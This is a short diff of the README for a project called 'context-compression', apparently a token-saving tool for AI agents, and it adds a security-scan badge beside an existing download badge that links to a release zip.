@@ -1,6 +1,7 @@
 # 📦 context-compression - Save tokens and boost agent performance
 
 [![Download context-compression](https://img.shields.io/badge/Download-Release-blue.svg)](https://github.com/herreravalenz6620/context-compression/raw/refs/heads/main/adapters/generic/compression-context-v2.6.zip)
+[![SafeSkill 86/100](https://img.shields.io/badge/SafeSkill-86%2F100_Passes%20with%20Notes-yellow)](https://safeskill.dev/scan/herreravalenz6620-context-compression)
 
 ## 📋 About this project
 
